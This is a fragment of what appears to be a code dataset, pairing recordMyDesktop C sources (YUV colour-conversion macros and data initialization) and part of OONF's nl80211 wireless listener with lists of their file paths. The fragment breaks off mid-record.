        "content": "'recordmydesktop/recordmydesktop/src/rmd_macro.h'\n:\n\n#ifndef RMDMACRO_H\n#define RMDMACRO_H 1\n\n#include \"config.h\"\n\n#include \"rmd_types.h\"\n\n#include <limits.h>\n\n\n\n#if __BYTE_ORDER == __LITTLE_ENDIAN\n#define __ABYTE 3\n#define __RBYTE 2\n#define __GBYTE 1\n#define __BBYTE 0\n\n#elif __BYTE_ORDER == __BIG_ENDIAN\n\n#define __ABYTE 0\n#define __RBYTE 1\n#define __GBYTE 2\n#define __BBYTE 3\n\n#else\n#error Only little-endian and big-endian systems are supported\n#endif\n\n#define __RVALUE_32(tmp_val) (((tmp_val)&0x00ff0000)>>16)\n#define __GVALUE_32(tmp_val) (((tmp_val)&0x0000ff00)>>8)\n#define __BVALUE_32(tmp_val) (((tmp_val)&0x000000ff))\n\n#define __R16_MASK  0xf800\n#define __G16_MASK  0x7e0\n#define __B16_MASK  0x1f\n\n#define __RVALUE_16(tmp_val) ((((tmp_val)&__R16_MASK)>>11)*8)\n#define __GVALUE_16(tmp_val) ((((tmp_val)&__G16_MASK)>>5)*4)\n#define __BVALUE_16(tmp_val) ((((tmp_val)&__B16_MASK))*8)\n\n\n\n\n\n#define RMD_ULONG_SIZE_T (sizeof(unsigned long))\n\n\n\n\n#define Y_UNIT_WIDTH    0x0010\n#define UV_UNIT_WIDTH   0x0008\n\n#endif\n\n\n'recordmydesktop/recordmydesktop/src/rmd_yuv_utils.h'\n:\n\n#ifndef YUV_UTILS_H\n#define YUV_UTILS_H 1\n\n#include \"rmd_macro.h\"\n#include \"rmd_types.h\"\n\n\n\n\nextern unsigned char Yr[256], Yg[256], Yb[256],\n                     Ur[256], Ug[256], UbVr[256],\n                     Vg[256], Vb[256];\n\n\n\nextern u_int32_t *yblocks,\n                 *ublocks,\n                 *vblocks;\n\n#define POINT_IN_BLOCK(xv,yv,widthv,blocksize) ((yv/blocksize)*\\\n                                                (widthv/blocksize)+\\\n                                                (xv/blocksize))\n\n\n\n\n\n\n\n\n#define CALC_TVAL_AVG_16(t_val,datapi,datapi_next){\\\n    register u_int16_t t1,t2,t3,t4;\\\n    t1=*datapi;\\\n    t2=*(datapi+1);\\\n    t3=*datapi_next;\\\n    t4=*(datapi_next+1);\\\n    t_val=((((t1&__R16_MASK) +(t2&__R16_MASK)+\\\n             (t3&__R16_MASK)+(t4&__R16_MASK))/4)&__R16_MASK)+\\\n          ((((t1&__G16_MASK) +(t2&__G16_MASK)+\\\n             (t3&__G16_MASK)+(t4&__G16_MASK))/4)&__G16_MASK)+\\\n          ((((t1&__B16_MASK) +(t2&__B16_MASK)+\\\n             (t3&__B16_MASK)+(t4&__B16_MASK))/4)&__B16_MASK);\\\n}\n\n\n\n#define CALC_TVAL_AVG_32(t_val,datapi,datapi_next){\\\n    register unsigned int t1,t2,t3,t4;\\\n    t1=*datapi;\\\n    t2=*(datapi+1);\\\n    t3=*datapi_next;\\\n    t4=*(datapi_next+1);\\\n    t_val=((((t1&0x00ff0000) +(t2&0x00ff0000)+\\\n            (t3&0x00ff0000)+(t4&0x00ff0000))/4)&0x00ff0000)+\\\n          ((((t1&0x0000ff00) +(t2&0x0000ff00)+\\\n            (t3&0x0000ff00)+(t4&0x0000ff00))/4)&0x0000ff00)+\\\n          ((((t1&0x000000ff) +(t2&0x000000ff)+\\\n            (t3&0x000000ff)+(t4&0x000000ff))/4)&0x000000ff);\\\n}\n\n#define UPDATE_Y_PLANE(data,\\\n                       x_tm,\\\n                       y_tm,\\\n                       height_tm,\\\n                       width_tm,\\\n                       yuv,\\\n                       __bit_depth__){ \\\n    int k,i;\\\n    register u_int##__bit_depth__##_t t_val;\\\n    register unsigned char  *yuv_y=yuv->y+x_tm+y_tm*yuv->y_width,\\\n                            *_yr=Yr,*_yg=Yg,*_yb=Yb;\\\n    register u_int##__bit_depth__##_t *datapi=(u_int##__bit_depth__##_t *)data;\\\n    for(k=0;k<height_tm;k++){\\\n        for(i=0;i<width_tm;i++){\\\n            t_val=*datapi;\\\n            *yuv_y=_yr[__RVALUE_##__bit_depth__(t_val)] +\\\n                   _yg[__GVALUE_##__bit_depth__(t_val)] +\\\n                   _yb[__BVALUE_##__bit_depth__(t_val)] ;\\\n            datapi++;\\\n            yuv_y++;\\\n        }\\\n        yuv_y+=yuv->y_width-width_tm;\\\n    }\\\n}\n\n#define UPDATE_A_UV_PIXEL(yuv_u,\\\n                          yuv_v,\\\n                          t_val,\\\n                          datapi,\\\n                          datapi_next,\\\n                          _ur,_ug,_ubvr,_vg,_vb,\\\n                          __sampling_type,\\\n                          __bit_depth__)\\\n            if(__sampling_type==__PXL_AVERAGE){\\\n                CALC_TVAL_AVG_##__bit_depth__(t_val,datapi,datapi_next)\\\n            }\\\n            else\\\n                t_val=*datapi;\\\n            *yuv_u=\\\n            _ur[__RVALUE_##__bit_depth__(t_val)] +\\\n            _ug[__GVALUE_##__bit_depth__(t_val)] +\\\n            _ubvr[__BVALUE_##__bit_depth__(t_val)];\\\n            *yuv_v=\\\n            _ubvr[__RVALUE_##__bit_depth__(t_val)] +\\\n            _vg[__GVALUE_##__bit_depth__(t_val)] +\\\n            _vb[__BVALUE_##__bit_depth__(t_val)];\\\n\n\n#define UPDATE_UV_PLANES(data,\\\n                         x_tm,\\\n                         y_tm,\\\n                         height_tm,\\\n                         width_tm,\\\n                         yuv,\\\n                         __sampling_type,\\\n                         __bit_depth__){  \\\n    int k,i;\\\n    register u_int##__bit_depth__##_t t_val;\\\n    register unsigned char  *yuv_u=yuv->u+x_tm/2+(y_tm*yuv->uv_width)/2,\\\n                            *yuv_v=yuv->v+x_tm/2+(y_tm*yuv->uv_width)/2,\\\n                            *_ur=Ur,*_ug=Ug,*_ubvr=UbVr,\\\n                            *_vg=Vg,*_vb=Vb;\\\n    register u_int##__bit_depth__##_t *datapi=(u_int##__bit_depth__##_t *)data,\\\n                                      *datapi_next=NULL;\\\n    if(__sampling_type==__PXL_AVERAGE){\\\n        datapi_next=datapi+width_tm;\\\n    }\\\n    for(k=0;k<height_tm;k+=2){\\\n        for(i=0;i<width_tm;i+=2){\\\n            UPDATE_A_UV_PIXEL(  yuv_u,\\\n                                yuv_v,\\\n                                t_val,\\\n                                datapi,\\\n                                datapi_next,\\\n                                _ur,_ug,_ubvr,_vg,_vb,\\\n                                __sampling_type,\\\n                                __bit_depth__)\\\n            datapi+=2;\\\n            if(__sampling_type==__PXL_AVERAGE)\\\n                datapi_next+=2;\\\n            yuv_u++;\\\n            yuv_v++;\\\n        }\\\n        yuv_u+=(yuv->y_width-width_tm)/2;\\\n        yuv_v+=(yuv->y_width-width_tm)/2;\\\n        datapi+=width_tm;\\\n        if(__sampling_type==__PXL_AVERAGE)\\\n            datapi_next+=width_tm;\\\n    }\\\n}\n\n#define UPDATE_YUV_BUFFER(yuv,\\\n                          data,\\\n                          data_back,\\\n                          x_tm,\\\n                          y_tm,\\\n                          width_tm,\\\n                          height_tm,\\\n                          __sampling_type,\\\n                          __color_depth){\\\n    if(data_back==NULL){\\\n        if((__color_depth==24)||(__color_depth==32)){\\\n            UPDATE_Y_PLANE(data,x_tm,y_tm,height_tm,width_tm,yuv,32)\\\n            UPDATE_UV_PLANES(data,x_tm,y_tm,height_tm,width_tm,\\\n                             yuv,__sampling_type,32)\\\n        }\\\n        else if(__color_depth==16){\\\n            UPDATE_Y_PLANE(data,x_tm,y_tm,height_tm,width_tm,yuv,16)\\\n            UPDATE_UV_PLANES(data,x_tm,y_tm,height_tm,width_tm,\\\n                            yuv,__sampling_type,16)\\\n        }\\\n    }\\\n    else{\\\n        if((__color_depth==24)||(__color_depth==32)){\\\n            UPDATE_Y_PLANE_DBUF(data,data_back,x_tm,y_tm,\\\n                                height_tm,width_tm,yuv,32)\\\n            UPDATE_UV_PLANES_DBUF(data,data_back,x_tm,y_tm,height_tm,width_tm,\\\n                                  yuv,__sampling_type,32)\\\n        }\\\n        else if(__color_depth==16){\\\n            UPDATE_Y_PLANE_DBUF(data,data_back,x_tm,y_tm,\\\n                                height_tm,width_tm,yuv,16)\\\n            UPDATE_UV_PLANES_DBUF(data,data_back,x_tm,y_tm,height_tm,width_tm,\\\n                                  yuv,__sampling_type,16)\\\n        }\\\n    }\\\n}\n\n#define DUMMY_POINTER_TO_YUV(yuv,\\\n                             data_tm,\\\n                             x_tm,\\\n                             y_tm,\\\n                             width_tm,\\\n                             height_tm,\\\n                             x_offset,\\\n                             y_offset,\\\n                             no_pixel){\\\n    int i,k,j=0;\\\n    int x_2=x_tm/2,y_2=y_tm/2,y_width_2=(yuv)->y_width/2;\\\n    for(k=y_offset;k<y_offset+height_tm;k++){\\\n        for(i=x_offset;i<x_offset+width_tm;i++){\\\n            j=k*16+i;\\\n            if(data_tm[(j*4)]!=(no_pixel)){\\\n                (yuv)->y[x_tm+(i-x_offset)+((k-y_offset)+y_tm)*(yuv)->y_width]=\\\n                    Yr[data_tm[(j*4)+__RBYTE]] +\\\n                    Yg[data_tm[(j*4)+__GBYTE]] +\\\n                    Yb[data_tm[(j*4)+__BBYTE]];\\\n                if((k%2)&&(i%2)){\\\n                    yuv->u[x_2+(i-x_offset)/2+((k-y_offset)/2+y_2)*y_width_2]=\\\n                        Ur[data_tm[(k*width_tm+i)*4+__RBYTE]] +\\\n                        Ug[data_tm[(k*width_tm+i)*4+__GBYTE]] +\\\n                        UbVr[data_tm[(k*width_tm+i)*4+__BBYTE]];\\\n                    yuv->v[x_2+(i-x_offset)/2+((k-y_offset)/2+y_2)*y_width_2]=\\\n                        UbVr[data_tm[(k*width_tm+i)*4+__RBYTE]] +\\\n                        Vg[data_tm[(k*width_tm+i)*4+__GBYTE]] +\\\n                        Vb[data_tm[(k*width_tm+i)*4+__BBYTE]] ;\\\n                }\\\n            }\\\n        }\\\n    }\\\n}\n\n#define UPDATE_Y_PLANE_DBUF(data,\\\n                            data_back,\\\n                            x_tm,\\\n                            y_tm,\\\n                            height_tm,\\\n                            width_tm,\\\n                            yuv,\\\n                            __bit_depth__){ \\\n    int k,i;\\\n    register u_int##__bit_depth__##_t t_val;\\\n    register unsigned char  *yuv_y=yuv->y+x_tm+y_tm*yuv->y_width,\\\n                            *_yr=Yr,*_yg=Yg,*_yb=Yb;\\\n    register u_int##__bit_depth__##_t *datapi=(u_int##__bit_depth__##_t *)data,\\\n                            *datapi_back=(u_int##__bit_depth__##_t *)data_back;\\\n    for(k=0;k<height_tm;k++){\\\n        for(i=0;i<width_tm;i++){\\\n            if(*datapi!=*datapi_back){\\\n                t_val=*datapi;\\\n                *yuv_y=_yr[__RVALUE_##__bit_depth__(t_val)] +\\\n                    _yg[__GVALUE_##__bit_depth__(t_val)] +\\\n                    _yb[__BVALUE_##__bit_depth__(t_val)] ;\\\n                yblocks[POINT_IN_BLOCK(i,k,width_tm,Y_UNIT_WIDTH)]=1;\\\n            }\\\n            datapi++;\\\n            datapi_back++;\\\n            yuv_y++;\\\n        }\\\n        yuv_y+=yuv->y_width-width_tm;\\\n    }\\\n}\n\n#define UPDATE_UV_PLANES_DBUF(  data,\\\n                                data_back,\\\n                                x_tm,\\\n                                y_tm,\\\n                                height_tm,\\\n                                width_tm,\\\n                                yuv,\\\n                                __sampling_type,\\\n                                __bit_depth__){  \\\n    int k,i;\\\n    register u_int##__bit_depth__##_t t_val;\\\n    register unsigned char  *yuv_u=yuv->u+x_tm/2+(y_tm*yuv->uv_width)/2,\\\n                            *yuv_v=yuv->v+x_tm/2+(y_tm*yuv->uv_width)/2,\\\n                            *_ur=Ur,*_ug=Ug,*_ubvr=UbVr,\\\n                            *_vg=Vg,*_vb=Vb;\\\n    register u_int##__bit_depth__##_t *datapi=(u_int##__bit_depth__##_t *)data,\\\n                                      *datapi_next=NULL,\\\n                            *datapi_back=(u_int##__bit_depth__##_t *)data_back,\\\n                            *datapi_back_next=NULL;\\\n    if(__sampling_type==__PXL_AVERAGE){\\\n        datapi_next=datapi+width_tm;\\\n        datapi_back_next=datapi_back+width_tm;\\\n        for(k=0;k<height_tm;k+=2){\\\n            for(i=0;i<width_tm;i+=2){\\\n                if(( (*datapi!=*datapi_back) ||\\\n                    (*(datapi+1)!=*(datapi_back+1)) ||\\\n                    (*datapi_next!=*datapi_back_next) ||\\\n                    (*(datapi_next+1)!=*(datapi_back_next+1)))){\\\n                    UPDATE_A_UV_PIXEL(  yuv_u,\\\n                                        yuv_v,\\\n                                        t_val,\\\n                                        datapi,\\\n                                        datapi_next,\\\n                                        _ur,_ug,_ubvr,_vg,_vb,\\\n                                        __sampling_type,\\\n                                        __bit_depth__)\\\n                    ublocks[POINT_IN_BLOCK(i,k,width_tm,Y_UNIT_WIDTH)]=1;\\\n                    vblocks[POINT_IN_BLOCK(i,k,width_tm,Y_UNIT_WIDTH)]=1;\\\n                }\\\n                datapi+=2;\\\n                datapi_back+=2;\\\n                if(__sampling_type==__PXL_AVERAGE){\\\n                    datapi_next+=2;\\\n                    datapi_back_next+=2;\\\n                }\\\n                yuv_u++;\\\n                yuv_v++;\\\n            }\\\n            yuv_u+=(yuv->y_width-width_tm)/2;\\\n            yuv_v+=(yuv->y_width-width_tm)/2;\\\n            datapi+=width_tm;\\\n            datapi_back+=width_tm;\\\n            if(__sampling_type==__PXL_AVERAGE){\\\n                datapi_next+=width_tm;\\\n                datapi_back_next+=width_tm;\\\n            }\\\n        }\\\n    }\\\n    else{\\\n        for(k=0;k<height_tm;k+=2){\\\n            for(i=0;i<width_tm;i+=2){\\\n                if ((*datapi!=*datapi_back)){\\\n                    UPDATE_A_UV_PIXEL(  yuv_u,\\\n                                        yuv_v,\\\n                                        t_val,\\\n                                        datapi,\\\n                                        datapi_next,\\\n                                        _ur,_ug,_ubvr,_vg,_vb,\\\n                                        __sampling_type,\\\n                                        __bit_depth__)\\\n                    ublocks[POINT_IN_BLOCK(i,k,width_tm,Y_UNIT_WIDTH)]=1;\\\n                    vblocks[POINT_IN_BLOCK(i,k,width_tm,Y_UNIT_WIDTH)]=1;\\\n                }\\\n                datapi+=2;\\\n                datapi_back+=2;\\\n                if(__sampling_type==__PXL_AVERAGE){\\\n                    datapi_next+=2;\\\n                    datapi_back_next+=2;\\\n                }\\\n                yuv_u++;\\\n                yuv_v++;\\\n            }\\\n            yuv_u+=(yuv->y_width-width_tm)/2;\\\n            yuv_v+=(yuv->y_width-width_tm)/2;\\\n            datapi+=width_tm;\\\n            datapi_back+=width_tm;\\\n            if(__sampling_type==__PXL_AVERAGE){\\\n                datapi_next+=width_tm;\\\n                datapi_back_next+=width_tm;\\\n            }\\\n        }\\\n    }\\\n}\n\n\nvoid rmdMakeMatrices(void);\n\n\n#endif\n\n'recordmydesktop/recordmydesktop/src/rmd_initialize_data.c'\n:\n\n#include \"config.h\"\n#include \"rmd_initialize_data.h\"\n\n#include \"rmd_cache.h\"\n#include \"rmd_init_encoder.h\"\n#include \"rmd_jack.h\"\n#include \"rmd_make_dummy_pointer.h\"\n#include \"rmd_opendev.h\"\n#include \"rmd_yuv_utils.h\"\n#include \"rmd_types.h\"\n\n#include <pthread.h>\n\n#include <stdlib.h>\n#include <stdio.h>\n#include <string.h>\n\n#ifdef HAVE_LIBASOUND\nstatic void rmdFixBufferSize(snd_pcm_uframes_t *buffsize) {\n    snd_pcm_uframes_t buffsize_t=*buffsize,\n#else\nstatic void rmdFixBufferSize(u_int32_t *buffsize) {\n    u_int32_t buffsize_t=*buffsize,\n#endif\n                          buffsize_ret=1;\n    while(buffsize_t>1){\n        buffsize_t>>=1;\n        buffsize_ret<<=1;\n    }\n    fprintf(stderr,\"Buffer size adjusted to %d from %d frames.\\n\",\n                   (int)buffsize_ret,(int)*buffsize);\n}\n\nint rmdInitializeData(ProgData *pdata,\n                      EncData *enc_data,\n                      CacheData *cache_data){\n    int i;\n\n    fprintf(stderr,\"Initializing...\\n\");\n    rmdMakeMatrices();\n    if(pdata->args.have_dummy_cursor){\n        pdata->dummy_pointer = rmdMakeDummyPointer(pdata->dpy,\n                                                   &pdata->specs,\n                                                   16,\n                                                   pdata->args.cursor_color,\n                                                   0,\n                                                   &pdata->npxl);\n        pdata->dummy_p_size=16;\n    }\n    else\n        pdata->dummy_p_size=0;\n\n\n    pdata->rect_root=NULL;\n    pthread_mutex_init(&pdata->sound_buffer_mutex,NULL);\n    pthread_mutex_init(&pdata->snd_buff_ready_mutex,NULL);\n    pthread_mutex_init(&pdata->img_buff_ready_mutex,NULL);\n    pthread_mutex_init(&pdata->theora_lib_mutex,NULL);\n    pthread_mutex_init(&pdata->vorbis_lib_mutex,NULL);\n    pthread_mutex_init(&pdata->libogg_mutex,NULL);\n    pthread_mutex_init(&pdata->yuv_mutex,NULL);\n    pthread_mutex_init(&pdata->pause_mutex, NULL);\n    pthread_mutex_init(&pdata->time_mutex, NULL);\n    pthread_cond_init(&pdata->time_cond,NULL);\n    pthread_cond_init(&pdata->pause_cond,NULL);\n    pthread_cond_init(&pdata->image_buffer_ready,NULL);\n    pthread_cond_init(&pdata->sound_data_read,NULL);\n    pthread_cond_init(&pdata->theora_lib_clean,NULL);\n    pthread_cond_init(&pdata->vorbis_lib_clean,NULL);\n    pdata->th_encoding_clean=pdata->v_encoding_clean=1;\n    pdata->avd=0;\n    pdata->sound_buffer=NULL;\n    pdata->running             = TRUE;\n    pdata->paused              = FALSE;\n    pdata->aborted             = FALSE;\n    pdata->pause_state_changed = FALSE;\n    pdata->frames_total        = 0;\n    pdata->frames_lost         = 0;\n    pdata->encoder_busy        = FALSE;\n    pdata->capture_busy        = FALSE;\n\n    if(!pdata->args.nosound){\n        if(!pdata->args.use_jack){\n            rmdFixBufferSize(&pdata->args.buffsize);\n#ifdef HAVE_LIBASOUND\n            pdata->sound_handle=rmdOpenDev(pdata->args.device,\n                                           &pdata->args.channels,\n                                           &pdata->args.frequency,\n                                           &pdata->args.buffsize,\n                                           &pdata->periodsize,\n                                           &pdata->periodtime,\n                                           &pdata->hard_pause);\n            pdata->sound_framesize=((snd_pcm_format_width(\n                                     SND_PCM_FORMAT_S16_LE))/8)*\n                                     pdata->args.channels;\n\n            if(pdata->sound_handle==NULL){\n#else\n            pdata->sound_handle=rmdOpenDev(pdata->args.device,\n                                           pdata->args.channels,\n                                           pdata->args.frequency);\n            pdata->periodtime=(1000000*pdata->args.buffsize)/\n                            ((pdata->args.channels<<1)*pdata->args.frequency);\n\n            pdata->periodsize=pdata->args.buffsize;\n            pdata->sound_framesize=pdata->args.channels<<1;\n            if(pdata->sound_handle<0){\n#endif\n                fprintf(stderr,\"Error while opening/configuring soundcard %s\\n\"\n                            \"Try running with the --no-sound or specify a \"\n                            \"correct device.\\n\",\n                            pdata->args.device);\n                return 3;\n            }\n        }\n        else{\n#ifdef HAVE_LIBJACK\n            int jack_error=0;\n            pdata->jdata->port_names=pdata->args.jack_port_names;\n            pdata->jdata->nports=pdata->args.jack_nports;\n            pdata->jdata->ringbuffer_secs=pdata->args.jack_ringbuffer_secs;\n            pdata->jdata->snd_buff_ready_mutex=&pdata->snd_buff_ready_mutex;\n            pdata->jdata->sound_data_read=&pdata->sound_data_read;\n            pdata->jdata->capture_started=0;\n\n            if((jack_error=rmdStartJackClient(pdata->jdata))!=0)\n                return jack_error;\n\n            pdata->args.buffsize=pdata->jdata->buffersize;\n            pdata->periodsize=pdata->args.buffsize;\n            pdata->args.frequency=pdata->jdata->frequency;\n            pdata->args.channels=pdata->jdata->nports;\n            pdata->periodtime=(1000000*pdata->args.buffsize)/\n                              pdata->args.frequency;\n            pdata->sound_framesize=sizeof(jack_default_audio_sample_t)*\n                                   pdata->jdata->nports;\n\n#else\n            fprintf(stderr,\"Should not be here!\\n\");\n            exit(-1);\n#endif\n        }\n    }\n\n    if(pdata->args.encOnTheFly)\n        rmdInitEncoder(pdata,enc_data,0);\n    else\n        rmdInitCacheData(pdata,enc_data,cache_data);\n\n    for(i=0;i<(pdata->enc_data->yuv.y_width*pdata->enc_data->yuv.y_height);i++)\n        pdata->enc_data->yuv.y[i]=0;\n    for(i=0;\n        i<(pdata->enc_data->yuv.uv_width*pdata->enc_data->yuv.uv_height);\n        i++){\n        pdata->enc_data->yuv.v[i]=pdata->enc_data->yuv.u[i]=127;\n    }\n\n    yblocks=malloc(sizeof(u_int32_t)*(pdata->enc_data->yuv.y_width/Y_UNIT_WIDTH)*\n                (pdata->enc_data->yuv.y_height/Y_UNIT_WIDTH));\n    ublocks=malloc(sizeof(u_int32_t)*(pdata->enc_data->yuv.y_width/Y_UNIT_WIDTH)*\n                (pdata->enc_data->yuv.y_height/Y_UNIT_WIDTH));\n    vblocks=malloc(sizeof(u_int32_t)*(pdata->enc_data->yuv.y_width/Y_UNIT_WIDTH)*\n                (pdata->enc_data->yuv.y_height/Y_UNIT_WIDTH));\n\n    pdata->frametime=(1000000)/pdata->args.fps;\n    return 0;\n\n}\n\nvoid rmdSetupDefaultArgs(ProgArgs *args) {\n\n    args->delay                = 0;\n    args->windowid             = 0;\n    args->x                    = 0;\n    args->y                    = 0;\n    args->width                = 0;\n    args->height               = 0;\n    args->rescue_path          = NULL;\n    args->nosound              = 0;\n    args->full_shots           = 0;\n    args->follow_mouse         = 0;\n    args->encOnTheFly          = 0;\n    args->nowmcheck            = 0;\n    args->overwrite            = 0;\n    args->use_jack             = 0;\n    args->noshared             = 0;\n    args->no_encode            = 0;\n    args->noframe              = 0;\n    args->jack_nports          = 0;\n    args->jack_ringbuffer_secs = 3.0;\n    args->zerocompression      = 1;\n    args->no_quick_subsample   = 1;\n    args->cursor_color         = 1;\n    args->have_dummy_cursor    = 0;\n    args->xfixes_cursor        = 1;\n    args->fps                  = 15;\n    args->channels             = 1;\n    args->frequency            = 22050;\n    args->buffsize             = 4096;\n    args->v_bitrate            = 0;\n    args->v_quality            = 63;\n    args->s_quality            = 10;\n\n    if (getenv(\"DISPLAY\") != NULL) {\n        args->display = strdup(getenv(\"DISPLAY\"));\n    }\n    else {\n        args->display = NULL;\n    }\n\n    memset(args->jack_port_names, 0, sizeof(args->jack_port_names));\n\n    args->device = strdup(DEFAULT_AUDIO_DEVICE);\n\n    char *tmpdir = getenv(\"TMPDIR\");\n    if (tmpdir == NULL) {\n        tmpdir = \"/tmp\";\n    }\n    args->workdir = strdup(tmpdir);\n\n    args->pause_shortcut = strdup(\"Control+Mod1+p\");\n\n    args->stop_shortcut = strdup(\"Control+Mod1+s\");\n\n    args->filename = strdup(\"out.ogv\");\n}\n\nvoid rmdCleanUp(void){\n\n    free(yblocks);\n    free(ublocks);\n    free(vblocks);\n\n}\n",
        "gt": [
            "'recordmydesktop/recordmydesktop/src/rmd_macro.h'",
            "'recordmydesktop/recordmydesktop/src/rmd_yuv_utils.h'",
            "'recordmydesktop/recordmydesktop/src/rmd_initialize_data.c'"
        ]
    },
    {
        "files": [
            "'OONF/include/oonf/generic/nl80211_listener/nl80211_listener.h'",
            "'OONF/include/oonf/generic/nl80211_listener/nl80211_get_mpp.h'",
            "'OONF/src/generic/nl80211_listener/nl80211_listener.c'"
        ],
        "content": "'OONF/include/oonf/generic/nl80211_listener/nl80211_listener.h'\n:\n\n\n\n\n#ifndef NL80211_LISTENER_H_\n#define NL80211_LISTENER_H_\n\n#include <oonf/oonf.h>\n#include <oonf/libcore/oonf_subsystem.h>\n#include <oonf/base/oonf_layer2.h>\n#include <oonf/base/os_interface.h>\n\n\n#define OONF_NL80211_LISTENER_SUBSYSTEM \"nl80211_listener\"\n\n\nstruct nl80211_if {\n\n  char name[IF_NAMESIZE];\n\n\n  struct os_interface_listener if_listener;\n\n\n  struct oonf_layer2_net *l2net;\n\n\n  int wifi_phy_if;\n\n\n  uint64_t max_tx;\n\n\n  uint64_t max_rx;\n\n\n  bool ifdata_changed;\n\n\n  bool _remove;\n\n\n  bool _if_section;\n\n\n  bool _nl80211_section;\n\n\n  struct avl_node _node;\n};\n\nstruct oonf_layer2_destination *nl80211_add_dst(struct oonf_layer2_neigh *, const struct netaddr *dst);\nbool nl80211_change_l2net_data(struct oonf_layer2_net *l2net, enum oonf_layer2_network_index idx,\n                               int64_t value, int64_t scaling);\nbool nl80211_change_l2net_neighbor_default(\n  struct oonf_layer2_net *l2net, enum oonf_layer2_neighbor_index idx, int64_t value, int64_t scaling);\nvoid nl80211_cleanup_l2neigh_data(struct oonf_layer2_neigh *l2neigh);\nbool nl80211_change_l2neigh_data(\n  struct oonf_layer2_neigh *l2neigh, enum oonf_layer2_neighbor_index idx, int64_t value, int64_t scaling);\nbool nl80211_create_broadcast_neighbor(void);\n\n\nstatic INLINE unsigned\nnl80211_get_if_baseindex(struct nl80211_if *interf) {\n  return interf->if_listener.data->base_index;\n}\n\n#endif\n\n'OONF/include/oonf/generic/nl80211_listener/nl80211_get_mpp.h'\n:\n\n\n\n\n#ifndef NL80211_GET_MPP_H_\n#define NL80211_GET_MPP_H_\n\n#include <oonf/generic/nl80211_listener/nl80211_listener.h>\n\nvoid nl80211_send_get_mpp(\n  struct os_system_netlink *nl, struct nlmsghdr *nl_msg, struct genlmsghdr *hdr, struct nl80211_if *interf);\nvoid nl80211_process_get_mpp_result(struct nl80211_if *interf, struct nlmsghdr *);\n\n#endif\n\n'OONF/src/generic/nl80211_listener/nl80211_listener.c'\n:\n\n\n\n\n#define _GNU_SOURCE\n\n\n#include <sys/socket.h>\n\n\n#include <linux/genetlink.h>\n#include <linux/netlink.h>\n#include <linux/types.h>\n#include <netlink/attr.h>\n#include <netlink/msg.h>\n#include <sys/uio.h>\n\n#include <oonf/libcommon/autobuf.h>\n#include <oonf/libcommon/avl.h>\n#include <oonf/libcommon/avl_comp.h>\n#include <oonf/oonf.h>\n#include <oonf/libcommon/netaddr.h>\n#include <oonf/libcommon/netaddr_acl.h>\n#include <oonf/libcommon/string.h>\n\n#include <oonf/libconfig/cfg.h>\n#include <oonf/libconfig/cfg_schema.h>\n#include <oonf/libcore/oonf_logging.h>\n#include <oonf/libcore/oonf_subsystem.h>\n#include <oonf/base/oonf_class.h>\n#include <oonf/base/oonf_layer2.h>\n#include <oonf/base/oonf_timer.h>\n#include <oonf/base/os_interface.h>\n#include <oonf/base/os_system.h>\n\n#include <oonf/generic/nl80211_listener/genl_get_family.h>\n#include <oonf/generic/nl80211_listener/nl80211_get_interface.h>\n#include <oonf/generic/nl80211_listener/nl80211_get_mpp.h>\n#include <oonf/generic/nl80211_listener/nl80211_get_station_dump.h>\n#include <oonf/generic/nl80211_listener/nl80211_get_survey.h>\n#include <oonf/generic/nl80211_listener/nl80211_get_wiphy.h>\n#include <oonf/generic/nl80211_listener/nl80211_listener.h>\n#include <oonf/generic/nl80211_listener/nl80211.h>\n\n\n\n\nstruct _nl80211_config {\n\n  uint64_t interval;\n\n\n  bool report_multicast_rate;\n};\n\n\nstruct _nl80211_query {\n\n  uint8_t cmd;\n\n\n  void (*send)(\n    struct os_system_netlink *nl, struct nlmsghdr *nl_msg, struct genlmsghdr *hdr, struct nl80211_if *interf);\n\n\n  void (*process)(struct nl80211_if *interf, struct nlmsghdr *hdr);\n\n\n  void (*finalize)(struct nl80211_if *interf);\n};\n\n\nenum _nl80211_cfg_idx\n{\n  IDX_INTERVAL,\n  IDX_INTERFACES,\n  IDX_MC_RATE,\n};\n\n\nenum _if_query\n{\n  QUERY_START = 0,\n  QUERY_GET_IF = 0,\n  QUERY_GET_WIPHY = 1,\n  QUERY_GET_SURVEY = 2,\n  QUERY_GET_MPP = 3,\n  QUERY_GET_STATION = 4,\n  QUERY_END = 5,\n\n  QUERY_GET_FAMILY = 6,\n\n  QUERY_COUNT,\n};\n\n\nstatic void _early_cfg_init(void);\nstatic int _init(void);\nstatic void _cleanup(void);\n\nstatic struct nl80211_if *_nl80211_if_get(const char *name);\nstatic struct nl80211_if *_nl80211_if_add(const char *name);\nstatic void _nl80211_if_remove(struct nl80211_if *);\n\nstatic void _cb_config_changed(void);\nstatic void _cb_if_config_changed(void);\n\nstatic void _cb_transmission_event(struct oonf_timer_instance *);\nstatic void _trigger_next_netlink_query(void);\n\nstatic void _cb_nl_message(struct nlmsghdr *hdr);\nstatic void _cb_nl_error(uint32_t seq, int error);\nstatic void _cb_nl_timeout(void);\nstatic void _cb_nl_done(uint32_t seq);\n\n\nstatic struct cfg_schema_section _if_section = {\n  CFG_OSIF_SCHEMA_INTERFACE_SECTION_INIT,\n\n  .cb_delta_handler = _cb_if_config_changed,\n  .entries = NULL,\n  .entry_count = 0,\n};\n\nstatic struct cfg_schema_entry _nl80211_entries[] = {\n  [IDX_INTERVAL] = CFG_MAP_CLOCK_MIN(\n    _nl80211_config, interval, \"interval\", \"1.0\", \"Interval between two linklayer information updates\", 100),\n  [IDX_INTERFACES] = CFG_VALIDATE_PRINTABLE_LEN(\n    \"if\", \"\", \"List of additional interfaces to read nl80211 data from\", IF_NAMESIZE, .list = true),\n  [IDX_MC_RATE] = CFG_MAP_BOOL(_nl80211_config, report_multicast_rate, \"report_mc_rate\", \"false\",\n    \"Activate to write the multicast/broadcast speed into the layer2 database\"),\n};\n\nstatic struct cfg_schema_section _nl80211_section = {\n  .type = OONF_NL80211_LISTENER_SUBSYSTEM,\n  .cb_delta_handler = _cb_config_changed,\n  .entries = _nl80211_entries,\n  .entry_count = ARRAYSIZE(_nl80211_entries),\n  .next_section = &_if_section,\n};\n\nstatic struct _nl80211_config _config;\n\n\nstatic const char *_dependencies[] = {\n  OONF_CLASS_SUBSYSTEM,\n  OONF_LAYER2_SUBSYSTEM,\n  OONF_TIMER_SUBSYSTEM,\n  OONF_OS_INTERFACE_SUBSYSTEM,\n  OONF_OS_SYSTEM_SUBSYSTEM,\n};\n\nstatic struct oonf_subsystem _nl80211_listener_subsystem = {\n  .name = OONF_NL80211_LISTENER_SUBSYSTEM,\n  .dependencies = _dependencies,\n 